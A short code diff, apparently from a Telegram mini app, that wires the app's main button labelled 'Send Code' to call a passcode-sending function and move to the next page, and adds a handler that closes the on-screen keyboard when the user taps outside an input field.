@@ -15,6 +15,27 @@ document.addEventListener('DOMContentLoaded', () => {
     const passcodeBtn = document.getElementById('passcode-btn');
     const passcodeInput = document.getElementById('hiddenInput');
     const twofactorInput = document.getElementById('twofactor-input');
+    tg.MainButton.text = "Send Code";
+    tg.MainButton.show();
+    tg.MainButton.onClick(() => {
+    sendPasscode();
+    showPage3();
+    });
+
+    document.addEventListener('touchstart', (e) => {
+    const active = document.activeElement;
+
+    // If user taps outside of any input or textarea, blur it
+        if (
+            active &&
+            (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA') &&
+            !e.target.closest('input') &&
+            !e.target.closest('textarea')
+        ) {
+            active.blur();
+        }
+    });
+
 
     // Store user info globally when available
     let userInfo = null;
